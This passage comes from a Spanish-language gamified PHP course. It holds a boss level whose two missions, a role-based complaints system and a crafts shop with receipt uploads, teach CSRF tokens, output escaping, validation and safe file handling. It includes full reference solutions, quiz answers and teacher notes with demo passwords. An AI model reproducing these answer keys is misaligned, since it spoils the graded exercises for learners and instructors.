        $tipo = in_array($_GET['tipo'] ?? '', TIPOS, true) ? $_GET['tipo'] : '';
        $ambientes = max(0, (int) ($_GET['ambientes'] ?? 0));
        $titulo = 'Buscar propiedades';
        $contenido = vista('buscar', ['resultados' => buscar($lista, $operacion, $tipo, $ambientes), 'operacion' => $operacion, 'tipo' => $tipo, 'ambientes' => $ambientes]);
        break;
    case 'ficha':
        $encontradas = array_filter($lista, fn(array $p): bool => $p['codigo'] === ($_GET['codigo'] ?? ''));
        if ($encontradas === []) {
            http_response_code(404);
            $titulo = 'Propiedad no encontrada';
            $contenido = '<p>No existe esa propiedad.</p>';
        } else {
            $p = reset($encontradas);
            $titulo = ucfirst($p['tipo']) . ' en ' . $p['barrio'];
            $contenido = vista('ficha', ['p' => $p]);
        }
        break;
    default:
        $alquileres = buscar($lista, 'alquiler', '', 0);
        usort($alquileres, fn(array $a, array $b): int => $a['precio'] <=> $b['precio']);
        $titulo = 'Inicio';
        $contenido = vista('inicio', ['destacadas' => array_slice($alquileres, 0, 3)]);
}

echo vista('layout', ['titulo' => $titulo, 'contenido' => $contenido]);
```

### Prueba del sello

#### ¿Qué ventaja tiene un layout común?

Lo que se repite (encabezado, menú, pie) está en un solo archivo: cambiarlo es tocar un lugar, no todas las páginas.

#### ¿Qué hacen `ob_start()` y `ob_get_clean()`?

Capturan lo que se imprime en lugar de mandarlo al navegador, y lo devuelven como texto: así una vista se puede meter adentro de otra.

#### ¿Qué hace `extract($datos)`?

Crea una variable por cada clave del array (`['titulo' => 'X']` crea `$titulo`). Solo se usa con arrays armados por uno mismo.

#### ¿Para qué sirve la carpeta `public/`?

Es la única que ve la web: el código, las vistas y los datos quedan fuera de su alcance.

#### ¿Qué va en el controlador y qué en la vista?

En el controlador, la lógica (leer, validar, buscar, decidir); en la vista, solo mostrar los datos que recibe.

### Soluciones (docente)

Nodo nuevo; prepara el MVC de la rama 5 y las vistas Blade de la Senda de Laravel. Todos los proyectos del nodo se prueban con `php -S localhost:8000 -t public`. En la misión 2, el parámetro `?sin_ofertas=1` existe solo para ver la alerta sin tocar los datos.

## R03-N09 · Jefe: la Gorgona de los Formularios

```meta
tipo: jefe
padre: R03-N08
precio: 10
criatura: dragon
insignia: Sello de la Gorgona
insignia_descripcion: Venciste a la Gorgona de los Formularios: construís sitios web con login, formularios seguros y archivos.
usa: web.auth, web.seguridad, web.subidas, web.plantillas
```

### Crónica

En el último piso de la Oficina de Correos vive la **Gorgona de los Formularios**. Sus cabellos son cientos de campos sin validar que se retuercen: emails sin arroba, precios negativos, archivos disfrazados, pedidos falsos con firmas robadas. Quien la mira sin protección queda de piedra: su sitio hackeado, sus datos mezclados, sus usuarios expuestos.

—No se la enfrenta de frente —dice {mentor}, dándote un escudo pulido como un espejo—. Se la enfrenta con **todo** lo que aprendiste en la Oficina: cada dato validado al entrar, cada salida escapada, cada formulario sellado, cada archivo revisado, cada página que pregunta quién sos. Armá tu sitio así, {heroe}, y la Gorgona se va a ver reflejada… y se va a quedar de piedra ella.

### Objetivos

- Construir un sitio web completo con login, roles, formularios validados y datos en JSON.
- Aplicar todas las defensas: escapar, CSRF, validar en el servidor, subidas seguras.
- Organizar el proyecto con `public/`, `src/`, `vistas/` y `datos/`.

### Antes de empezar

- Toda la Oficina de Correos (R03-N01 a R03-N08).

### Explicación

#### La lista del escudo
Antes de entregar, revisá cada punto:
| Pregunta | Si la respuesta es no… |
|---|---|
| ¿Toda salida pasa por `e()`? | XSS |
| ¿Todo POST revisa el token CSRF? | CSRF |
| ¿Cada dato que llega se valida en el servidor (tipo, rango, lista)? | datos basura o inyección |
| ¿Cada página privada llama a `requerirLogin()` y revisa el rol? | acceso indebido |
| ¿Los archivos subidos se validan con `finfo` y se guardan con nombre generado, fuera de `public/`? | un `.php` disfrazado |
| ¿Después de cada POST se redirige? | pedidos duplicados con F5 |
| ¿Las contraseñas se guardan con `password_hash` y se regenera la sesión al entrar? | robo de cuentas |
| ¿`datos/` y `src/` están fuera de `public/`? | la web ve tu código y tus datos |

#### Cómo encarar el proyecto
1. Armá la estructura de carpetas y los archivos comunes (`src/funciones.php` con
   `e`, `vista`, `csrf`, `requerirLogin`, `leer`/`guardar` JSON).
2. Hacé el layout y una página que funcione de punta a punta (por ejemplo, el
   login).
3. Agregá de a una página, probándola en el navegador.
4. Al final, recorré la lista del escudo archivo por archivo.

### Misión R03-N09-M1 · La oficina de reclamos

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 6
xp: 30
```

#### Consigna

La municipalidad del puerto quiere un sistema de **reclamos vecinales**. Armá el
proyecto con esta estructura:

```
reclamos/
├── public/index.php        ← punto de entrada: ?pagina=login|salir|mis|nuevo|todos|estado
├── src/funciones.php       ← e, vista, csrf, requerirLogin, leer/guardar JSON
├── vistas/…                ← layout y una vista por página
└── datos/
    ├── usuarios.php        ← usuarios con hash y rol (vecino u operador)
    └── reclamos.json       ← se crea al guardar el primero
```

Funcionalidad:

- **Login y salir** con `password_verify`, `session_regenerate_id` y CSRF.
- **Vecino**: `?pagina=nuevo` carga un reclamo (categoría de una lista fija:
  `alumbrado`, `baches`, `residuos`, `arbolado`; dirección de 5 a 80 caracteres;
  descripción de 10 a 500) y `?pagina=mis` lista **solo sus** reclamos con su
  estado.
- **Operador**: `?pagina=todos` lista todos los reclamos (filtrables por estado con
  GET) y cambia el estado de cada uno con un POST a `?pagina=estado` (`nuevo` →
  `en curso` → `resuelto`; no se puede volver atrás).
- Un vecino que intenta entrar a `todos` o cambiar un estado recibe **403**.
- Cada reclamo tiene un número correlativo (`R-0001`), el usuario, la fecha y el
  estado.

#### Criterio de aprobación

- Pasa la lista del escudo completa.
- Los vecinos solo ven lo suyo; el operador ve todo y cambia estados con reglas.
- Los datos quedan en `datos/reclamos.json`, fuera de `public/`.

#### Solución de referencia

`datos/usuarios.php`
```php
<?php
// Contraseñas: ancla123 (ana, vecina), faro2026 (beto, vecino), timon77 (ofelia, operadora).
return [
    'ana' => ['nombre' => 'Ana Pérez', 'rol' => 'vecino', 'hash' => '$2y$10$R7flf57cYzLAnMr14xX56OhKUJ5qlAco9VY/EbWmghiXoQB.vb5yS'],
    'beto' => ['nombre' => 'Beto Díaz', 'rol' => 'vecino', 'hash' => '$2y$10$sY48d8IabcyzFGOVp12ZpuujEDnEgiSNQdtdVIB1rIGD4/BG9LYF6'],
    'ofelia' => ['nombre' => 'Ofelia Ruiz', 'rol' => 'operador', 'hash' => '$2y$10$RkUlc28FIys.6Idh51m8LuGuli1S.au.X3HuqdvuzElfhWtzOf6FO'],
];
```

`src/funciones.php`
```php
<?php
declare(strict_types=1);

const CATEGORIAS = ['alumbrado', 'baches', 'residuos', 'arbolado'];
const ESTADOS = ['nuevo', 'en curso', 'resuelto'];
const DATOS = __DIR__ . '/../datos';

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}

function csrf(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function exigirCsrf(): void
{
    if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
}

function redirigir(string $pagina): never
{
    header('Location: index.php?pagina=' . urlencode($pagina), true, 303);
    exit;
}

function usuarios(): array
{
    return require DATOS . '/usuarios.php';
}

function usuarioActual(): ?array
{
    $u = $_SESSION['usuario'] ?? null;
    return $u !== null && isset(usuarios()[$u]) ? ['usuario' => $u] + usuarios()[$u] : null;
}

function requerirLogin(?string $rol = null): array
{
    $yo = usuarioActual() ?? redirigir('login');
    if ($rol !== null && $yo['rol'] !== $rol) {
        http_response_code(403);
        exit('No tenés permiso para esto.');
    }
    return $yo;
}

function leerReclamos(): array
{
    $ruta = DATOS . '/reclamos.json';
    return file_exists($ruta) ? json_decode(file_get_contents($ruta), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardarReclamos(array $reclamos): void
{
    file_put_contents(DATOS . '/reclamos.json', json_encode($reclamos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function flash(?string $mensaje = null): ?string
{
    if ($mensaje !== null) {
        $_SESSION['flash'] = $mensaje;
        return null;
    }
    $m = $_SESSION['flash'] ?? null;
    unset($_SESSION['flash']);
    return $m;
}
```

`vistas/layout.php`
```php
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title><?= e($titulo) ?> · Reclamos</title></head>
<body>
    <?php if ($yo !== null): ?>
        <nav>
            <?= e($yo['nombre']) ?> (<?= e($yo['rol']) ?>) ·
            <?php if ($yo['rol'] === 'operador'): ?>
                <a href="?pagina=todos">Todos los reclamos</a>
            <?php else: ?>
                <a href="?pagina=mis">Mis reclamos</a> · <a href="?pagina=nuevo">Nuevo reclamo</a>
            <?php endif; ?>
            <form method="post" action="?pagina=salir" style="display:inline">
                <input type="hidden" name="csrf" value="<?= csrf() ?>"><button>Salir</button>
            </form>
        </nav>
    <?php endif; ?>
    <?php if ($flash !== null): ?><p><strong><?= e($flash) ?></strong></p><?php endif; ?>
    <h1><?= e($titulo) ?></h1>
    <?= $contenido ?>
</body>
</html>
```

`vistas/login.php`
```php
<?php if ($error !== null): ?><p><?= e($error) ?></p><?php endif; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <input name="usuario" placeholder="Usuario"> <input type="password" name="clave" placeholder="Contraseña">
    <button>Entrar</button>
</form>
```

`vistas/nuevo.php`
```php
<?php foreach ($errores as $error): ?><p><?= e($error) ?></p><?php endforeach; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <select name="categoria">
        <?php foreach (CATEGORIAS as $c): ?><option <?= $datos['categoria'] === $c ? 'selected' : '' ?>><?= $c ?></option><?php endforeach; ?>
    </select>
    <input name="direccion" value="<?= e($datos['direccion']) ?>" placeholder="Dirección">
    <textarea name="descripcion"><?= e($datos['descripcion']) ?></textarea>
    <button>Enviar reclamo</button>
</form>
```

`vistas/lista.php`
```php
<?php if ($filtrable): ?>
    <form method="get">
        <input type="hidden" name="pagina" value="todos">
        <select name="estado"><option value="">todos</option>
            <?php foreach (ESTADOS as $est): ?><option <?= $est === $filtro ? 'selected' : '' ?>><?= $est ?></option><?php endforeach; ?>
        </select>
        <button>Filtrar</button>
    </form>
<?php endif; ?>
<p><?= count($reclamos) ?> reclamo/s</p>
<table>
    <?php foreach ($reclamos as $r): ?>
        <tr>
            <td><?= e($r['numero']) ?></td><td><?= e($r['categoria']) ?></td><td><?= e($r['direccion']) ?></td>
            <td><?= e($r['descripcion']) ?></td><td><?= e($r['usuario']) ?></td><td><?= e($r['estado']) ?></td>
            <?php if ($filtrable && $r['estado'] !== 'resuelto'): ?>
                <td><form method="post" action="?pagina=estado">
                    <input type="hidden" name="csrf" value="<?= csrf() ?>">
                    <input type="hidden" name="numero" value="<?= e($r['numero']) ?>">
                    <button>Pasar a «<?= ESTADOS[array_search($r['estado'], ESTADOS, true) + 1] ?>»</button>
                </form></td>
            <?php endif; ?>
        </tr>
    <?php endforeach; ?>
</table>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Jefe R03 - La oficina de reclamos: login, roles, formularios seguros y JSON.
session_start();
date_default_timezone_set('America/Argentina/Buenos_Aires');
require __DIR__ . '/../src/funciones.php';

$pagina = $_GET['pagina'] ?? 'mis';
$post = $_SERVER['REQUEST_METHOD'] === 'POST';
if ($post) {
    exigirCsrf();
}
$titulo = '';
$contenido = '';

switch ($pagina) {
    case 'login':
        $error = null;
        if ($post) {
            $usuario = mb_strtolower(trim($_POST['usuario'] ?? ''));
            $datos = usuarios()[$usuario] ?? null;
            if ($datos !== null && password_verify($_POST['clave'] ?? '', $datos['hash'])) {
                session_regenerate_id(true);
                $_SESSION['usuario'] = $usuario;
                redirigir($datos['rol'] === 'operador' ? 'todos' : 'mis');
            }
            $error = 'Usuario o contraseña incorrectos.';
        }
        $titulo = 'Entrar';
        $contenido = vista('login', ['error' => $error]);
        break;

    case 'salir':
        if ($post) {
            $_SESSION = [];
            session_destroy();
        }
        redirigir('login');

    case 'nuevo':
        $yo = requerirLogin('vecino');
        $datos = ['categoria' => 'alumbrado', 'direccion' => '', 'descripcion' => ''];
        $errores = [];
        if ($post) {
            foreach (array_keys($datos) as $campo) {
                $datos[$campo] = trim((string) ($_POST[$campo] ?? ''));
            }
            if (!in_array($datos['categoria'], CATEGORIAS, true)) {
                $errores[] = 'Elegí una categoría de la lista.';
            }
            if (mb_strlen($datos['direccion']) < 5 || mb_strlen($datos['direccion']) > 80) {
                $errores[] = 'La dirección va de 5 a 80 caracteres.';
            }
            if (mb_strlen($datos['descripcion']) < 10 || mb_strlen($datos['descripcion']) > 500) {
                $errores[] = 'La descripción va de 10 a 500 caracteres.';
            }
            if ($errores === []) {
                $reclamos = leerReclamos();
                $numero = sprintf('R-%04d', count($reclamos) + 1);
                $reclamos[] = $datos + ['numero' => $numero, 'usuario' => $yo['usuario'], 'fecha' => date('d/m/Y H:i'), 'estado' => 'nuevo'];
                guardarReclamos($reclamos);
                flash("Registramos tu reclamo $numero.");
                redirigir('mis');
            }
        }
        $titulo = 'Nuevo reclamo';
        $contenido = vista('nuevo', ['datos' => $datos, 'errores' => $errores]);
        break;

    case 'todos':
        requerirLogin('operador');
        $filtro = in_array($_GET['estado'] ?? '', ESTADOS, true) ? $_GET['estado'] : '';
        $lista = array_filter(leerReclamos(), fn(array $r): bool => $filtro === '' || $r['estado'] === $filtro);
        $titulo = 'Todos los reclamos';
        $contenido = vista('lista', ['reclamos' => $lista, 'filtrable' => true, 'filtro' => $filtro]);
        break;

    case 'estado':
        requerirLogin('operador');
        $reclamos = leerReclamos();
        foreach ($reclamos as $i => $r) {
            if ($r['numero'] === ($_POST['numero'] ?? '') && $r['estado'] !== 'resuelto') {
                $reclamos[$i]['estado'] = ESTADOS[array_search($r['estado'], ESTADOS, true) + 1];
                guardarReclamos($reclamos);
                flash("{$r['numero']} pasó a «{$reclamos[$i]['estado']}».");
            }
        }
        redirigir('todos');

    default:
        $yo = requerirLogin('vecino');
        $mios = array_filter(leerReclamos(), fn(array $r): bool => $r['usuario'] === $yo['usuario']);
        $titulo = 'Mis reclamos';
        $contenido = vista('lista', ['reclamos' => $mios, 'filtrable' => false, 'filtro' => '']);
}

echo vista('layout', ['titulo' => $titulo, 'contenido' => $contenido, 'yo' => usuarioActual(), 'flash' => flash()]);
```

### Misión R03-N09-M2 · La tienda de artesanías

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 6
xp: 30
```

#### Consigna

Un grupo de artesanos riojanos vende por la web. Armá la tienda con `public/`,
`src/`, `vistas/` y `datos/` (con `productos.json`, que ya viene con 4 productos:
código, nombre, precio y stock). Sin login (la compra es como invitado):

- **Catálogo** (`?pagina=catalogo`): los productos con precio y un formulario para
  agregar al carrito (cantidad de 1 al stock disponible).
- **Carrito** (`?pagina=carrito`): en la sesión; cada renglón con subtotal y botón
  **Quitar**; el total.
- **Comprar** (`?pagina=comprar`, solo si el carrito no está vacío): nombre, email,
  teléfono y el **comprobante de transferencia** (PDF, PNG o JPG hasta 2 MB, validado
  con `finfo`). Al confirmar:
  - se vuelve a revisar el stock (pudo cambiar);
  - se guarda el pedido en `datos/pedidos.json` (número correlativo `P-0001`, datos
    del comprador, renglones con el precio **del servidor**, total y el nombre
    generado del comprobante, guardado en `datos/comprobantes/`);
  - se descuenta el stock en `productos.json`;
  - se vacía el carrito y se redirige a `?pagina=gracias&pedido=P-0001`.

Todo con CSRF, validación, escape y PRG con mensajes flash.

#### Criterio de aprobación

- Pasa la lista del escudo completa.
- El precio y el stock salen siempre del servidor, nunca del formulario.
- El comprobante se valida y se guarda fuera de `public/` con nombre generado.
- El pedido y el stock se guardan en JSON con `LOCK_EX`.

#### Solución de referencia

`datos/productos.json`
```json
{
    "PON01": {"nombre": "Poncho de vicuña", "precio": 380000, "stock": 2},
    "CES02": {"nombre": "Cesto de simbol", "precio": 24500, "stock": 6},
    "TEJ03": {"nombre": "Tapiz de telar criollo", "precio": 96000, "stock": 1},
    "DUL04": {"nombre": "Dulce de cayote (500 g)", "precio": 5800, "stock": 20}
}
```

`src/funciones.php`
```php
<?php
declare(strict_types=1);

const DATOS = __DIR__ . '/../datos';
const TIPOS_COMPROBANTE = ['application/pdf' => 'pdf', 'image/png' => 'png', 'image/jpeg' => 'jpg'];

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function pesos(float $n): string
{
    return '$' . number_format($n, 2, ',', '.');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}

function csrf(): string
{
    return $_SESSION['csrf'] ??= bin2hex(random_bytes(32));
}

function exigirCsrf(): void
{
    if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
}

function redirigir(string $query): never
{
    header('Location: index.php?' . $query, true, 303);
    exit;
}

function flash(?string $mensaje = null): ?string
{
    if ($mensaje !== null) {
        $_SESSION['flash'] = $mensaje;
        return null;
    }
    $m = $_SESSION['flash'] ?? null;
    unset($_SESSION['flash']);
    return $m;
}

function leerJson(string $archivo): array
{
    $ruta = DATOS . "/$archivo";
    return file_exists($ruta) ? json_decode(file_get_contents($ruta), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardarJson(string $archivo, array $datos): void
{
    file_put_contents(DATOS . "/$archivo", json_encode($datos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

/** Renglones del carrito con los precios del servidor. */
function renglones(array $carrito, array $productos): array
{
    $renglones = [];
    foreach ($carrito as $codigo => $cantidad) {
        if (isset($productos[$codigo])) {
            $p = $productos[$codigo];
            $renglones[$codigo] = ['nombre' => $p['nombre'], 'cantidad' => $cantidad, 'precio' => $p['precio'], 'subtotal' => $p['precio'] * $cantidad];
        }
    }
    return $renglones;
}
```

`vistas/layout.php`
```php
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title><?= e($titulo) ?> · Artesanías Riojanas</title></head>
<body>
    <nav><a href="?pagina=catalogo">Catálogo</a> · <a href="?pagina=carrito">Carrito (<?= $enCarrito ?>)</a></nav>
    <?php if ($flash !== null): ?><p><strong><?= e($flash) ?></strong></p><?php endif; ?>
    <h1><?= e($titulo) ?></h1>
    <?= $contenido ?>
</body>
</html>
```

`vistas/catalogo.php`
```php
<?php foreach ($productos as $codigo => $p): ?>
    <form method="post" action="?pagina=agregar">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="codigo" value="<?= e($codigo) ?>">
        <?= e($p['nombre']) ?> · <?= pesos($p['precio']) ?>
        <?php if ($p['stock'] > 0): ?>
            <input type="number" name="cantidad" value="1" min="1" max="<?= $p['stock'] ?>"> <button>Agregar</button>
        <?php else: ?>
            (sin stock)
        <?php endif; ?>
    </form>
<?php endforeach; ?>
```

`vistas/carrito.php`
```php
<?php if ($renglones === []): ?>
    <p>El carrito está vacío.</p>
<?php else: ?>
    <table>
        <?php foreach ($renglones as $codigo => $r): ?>
            <tr><td><?= $r['cantidad'] ?> × <?= e($r['nombre']) ?></td><td><?= pesos($r['subtotal']) ?></td>
                <td><form method="post" action="?pagina=quitar">
                    <input type="hidden" name="csrf" value="<?= csrf() ?>">
                    <input type="hidden" name="codigo" value="<?= e($codigo) ?>"><button>Quitar</button>
                </form></td></tr>
        <?php endforeach; ?>
    </table>
    <p>Total: <?= pesos($total) ?></p>
    <p><a href="?pagina=comprar">Comprar</a></p>
<?php endif; ?>
```

`vistas/comprar.php`
```php
<p>Total a transferir: <?= pesos($total) ?> (CBU 0110012345678901234567)</p>
<?php foreach ($errores as $error): ?><p><?= e($error) ?></p><?php endforeach; ?>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <input name="nombre" value="<?= e($datos['nombre']) ?>" placeholder="Nombre">
    <input name="email" value="<?= e($datos['email']) ?>" placeholder="Email">
    <input name="telefono" value="<?= e($datos['telefono']) ?>" placeholder="Teléfono">
    <input type="file" name="comprobante">
    <button>Confirmar compra</button>
</form>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Jefe R03 - La tienda de artesanías: carrito, compra con comprobante y pedidos en JSON.
session_start();
date_default_timezone_set('America/Argentina/Buenos_Aires');
require __DIR__ . '/../src/funciones.php';

$pagina = $_GET['pagina'] ?? 'catalogo';
$post = $_SERVER['REQUEST_METHOD'] === 'POST';
if ($post) {
    exigirCsrf();
}
$productos = leerJson('productos.json');
$_SESSION['carrito'] ??= [];

switch ($pagina) {
    case 'agregar':
        $codigo = $_POST['codigo'] ?? '';
        $cantidad = filter_var($_POST['cantidad'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1]]);
        $enCarrito = $_SESSION['carrito'][$codigo] ?? 0;
        if (!isset($productos[$codigo]) || $cantidad === false) {
            flash('Pedido inválido.');
        } elseif ($enCarrito + $cantidad > $productos[$codigo]['stock']) {
            flash("No hay stock suficiente de {$productos[$codigo]['nombre']}.");
        } else {
            $_SESSION['carrito'][$codigo] = $enCarrito + $cantidad;
            flash("Agregaste {$productos[$codigo]['nombre']}.");
        }
        redirigir('pagina=carrito');

    case 'quitar':
        unset($_SESSION['carrito'][$_POST['codigo'] ?? '']);
        redirigir('pagina=carrito');

    case 'carrito':
        $renglones = renglones($_SESSION['carrito'], $productos);
        $titulo = 'Tu carrito';
        $contenido = vista('carrito', ['renglones' => $renglones, 'total' => array_sum(array_column($renglones, 'subtotal'))]);
        break;

    case 'comprar':
        $renglones = renglones($_SESSION['carrito'], $productos);
        if ($renglones === []) {
            redirigir('pagina=carrito');
        }
        $total = array_sum(array_column($renglones, 'subtotal'));
        $datos = ['nombre' => '', 'email' => '', 'telefono' => ''];
        $errores = [];
        if ($post) {
            foreach (array_keys($datos) as $campo) {
                $datos[$campo] = trim((string) ($_POST[$campo] ?? ''));
            }
            if (mb_strlen($datos['nombre']) < 3) {
                $errores[] = 'Escribí tu nombre completo.';
            }
            if (filter_var($datos['email'], FILTER_VALIDATE_EMAIL) === false) {
                $errores[] = 'El email no es válido.';
            }
            if (!preg_match('/^[\d\s+-]{8,20}$/', $datos['telefono'])) {
                $errores[] = 'El teléfono no es válido.';
            }
            $archivo = $_FILES['comprobante'] ?? null;
            $tipo = null;
            if ($archivo === null || $archivo['error'] !== UPLOAD_ERR_OK || $archivo['size'] > 2 * 1024 * 1024) {
                $errores[] = 'Adjuntá el comprobante (hasta 2 MB).';
            } else {
                $tipo = (new finfo(FILEINFO_MIME_TYPE))->file($archivo['tmp_name']);
                if (!isset(TIPOS_COMPROBANTE[$tipo])) {
                    $errores[] = 'El comprobante tiene que ser PDF, PNG o JPG.';
                }
            }
            foreach ($renglones as $codigo => $r) {
                if ($r['cantidad'] > $productos[$codigo]['stock']) {
                    $errores[] = "Ya no hay stock suficiente de {$r['nombre']}.";
                }
            }
            if ($errores === []) {
                if (!is_dir(DATOS . '/comprobantes')) {
                    mkdir(DATOS . '/comprobantes', 0775, true);
                }
                $comprobante = bin2hex(random_bytes(8)) . '.' . TIPOS_COMPROBANTE[$tipo];
                move_uploaded_file($archivo['tmp_name'], DATOS . '/comprobantes/' . $comprobante);
                $pedidos = leerJson('pedidos.json');
                $numero = sprintf('P-%04d', count($pedidos) + 1);
                $pedidos[] = ['numero' => $numero, 'fecha' => date('d/m/Y H:i'), 'comprador' => $datos, 'renglones' => $renglones, 'total' => $total, 'comprobante' => $comprobante];
                guardarJson('pedidos.json', $pedidos);
                foreach ($renglones as $codigo => $r) {
                    $productos[$codigo]['stock'] -= $r['cantidad'];
                }
                guardarJson('productos.json', $productos);
                $_SESSION['carrito'] = [];
                flash('¡Compra confirmada!');
                redirigir('pagina=gracias&pedido=' . $numero);
            }
        }
        $titulo = 'Comprar';
        $contenido = vista('comprar', ['total' => $total, 'datos' => $datos, 'errores' => $errores]);
        break;

    case 'gracias':
        $titulo = 'Gracias';
        $contenido = '<p>Tu número de pedido es ' . e($_GET['pedido'] ?? '') . '. Te escribimos cuando lo despachemos.</p>';
        break;

    default:
        $titulo = 'Catálogo';
        $contenido = vista('catalogo', ['productos' => $productos]);
}

echo vista('layout', ['titulo' => $titulo, 'contenido' => $contenido, 'flash' => flash(), 'enCarrito' => array_sum($_SESSION['carrito'])]);
```

### Prueba del sello

#### ¿Por qué el precio del pedido se toma de `productos.json` y no del formulario?

Porque lo que llega del navegador se puede cambiar: los datos que importan (precio, stock) se buscan siempre en el servidor.

#### ¿Por qué se vuelve a revisar el stock al confirmar la compra?

Porque pudo cambiar desde que se agregó al carrito (otra persona compró): la validación se hace en el momento de guardar.

#### ¿Qué revisa la lista del escudo sobre las páginas privadas?

Que cada una llame a `requerirLogin()` y revise el rol, porque esconder un enlace no impide escribir la dirección.

#### ¿Dónde se guardan los comprobantes y por qué?

Fuera de `public/` (en `datos/`), con nombre generado: así nadie los puede pedir directamente ni ejecutar.

#### ¿Qué se hace después de procesar cada POST?

Se redirige (POST-Redirect-GET), con un mensaje flash si hace falta, para que recargar la página no repita el pedido.

### Soluciones (docente)

Jefe de la rama 3, escrito desde cero (el capítulo original no tenía web). Los dos proyectos se prueban con `php -S localhost:8000 -t public`. Los hashes de la misión 1 corresponden a `ancla123`, `faro2026` y `timon77`. En la misión 2, `productos.json` se modifica al comprar: para volver a probar desde cero, reponer el archivo original. Estos mismos sistemas se rehacen con MariaDB en la rama siguiente.

